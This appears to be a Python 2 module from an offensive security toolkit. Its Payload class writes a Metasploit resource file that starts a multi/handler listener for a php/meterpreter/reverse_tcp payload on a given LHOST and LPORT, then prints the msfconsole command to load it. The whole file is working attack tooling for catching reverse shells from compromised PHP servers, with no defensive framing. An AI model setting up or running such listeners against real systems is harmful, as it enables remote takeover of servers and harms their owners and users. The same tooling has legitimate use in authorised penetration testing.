__author__ = 'rotlogix'

import datetime
from blessings import Terminal


class Payload:
    t = Terminal()

    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def handler(self):
        opt = "use multi/handler\n"
        opt += "set payload php/meterpreter/reverse_tcp\n"
        opt += "set LHOST {0}\n set LPORT {1}\n".format(self.lhost, self.lport)
        opt += "set ExitOnSession false\n"
        opt += "exploit -j\n"
        f = file("php_listener.rc", "w")
        f.write(opt)
        f.close()
        print Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Generated Metasploit Resource File"
        print Payload.t.red("[{0}] ".format(datetime.datetime.now())) + "Load Metasploit: msfconsole -r php_listener.rc"
